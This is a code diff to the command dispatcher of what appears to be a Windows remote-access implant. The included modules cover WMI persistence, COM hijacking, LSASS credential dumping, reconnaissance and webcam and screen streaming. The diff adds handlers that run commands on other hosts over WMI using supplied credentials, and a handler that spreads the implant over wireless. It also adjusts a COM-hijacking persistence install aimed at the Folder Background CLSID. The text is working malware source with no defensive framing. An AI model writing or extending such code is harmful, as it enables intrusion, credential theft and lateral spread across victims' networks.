@@ -15,6 +15,9 @@
 #include "../persistence/WmiPersistence.h"
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
+#include "../utils/Shared.h"
+#include "../lateral/WmiExec.h"
+#include "../lateral/WirelessSpread.h"
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
 #include "../crypto/Base64.h"
@@ -112,6 +115,26 @@ void TaskDispatcher::dispatch(const Task& task) {
                     streaming::StopScreenStream();
                     result.output = "SCREEN_STREAM_STATUS:Screen stream stopped";
                 }
+                break;
+            }
+            case TaskType::GET_LOGS: {
+                result.output = "LOGS:\n" + utils::Logger::GetRecentLogs();
+                break;
+            }
+            case TaskType::LATERAL_RCE: {
+                // Parse cmd: target_ip|user|pass|command
+                std::string target, user, pass, rcmd;
+                std::istringstream iss(task.cmd);
+                std::getline(iss, target, '|');
+                std::getline(iss, user, '|');
+                std::getline(iss, pass, '|');
+                std::getline(iss, rcmd); // rest as command
+
+                result.output = "LATERAL_RCE:" + lateral::WmiExec(target, user, pass, rcmd);
+                break;
+            }
+            case TaskType::LATERAL_WIRELESS: {
+                result.output = lateral::SpreadWireless(task.cmd);
                 break;
             }
             case TaskType::WEBCAM_STREAM: {
@@ -248,7 +271,7 @@ void TaskDispatcher::dispatch(const Task& task) {
                 } else if (cmd.find("com install") == 0) {
                     std::string clsid = "{00021400-0000-0000-C000-000000000046}"; // Folder Background
                     if (cmd.length() > 12) clsid = cmd.substr(12);
-                    if (persistence::ComHijacker::Install(implantPath, clsid))
+                    if (persistence::ComHijacker::Install(utils::s2ws(implantPath), utils::s2ws(clsid)))
                         result.output = "ADV_PERSISTENCE:COM hijacking installed for " + clsid;
                     else result.error = "COM install failed";
                 }
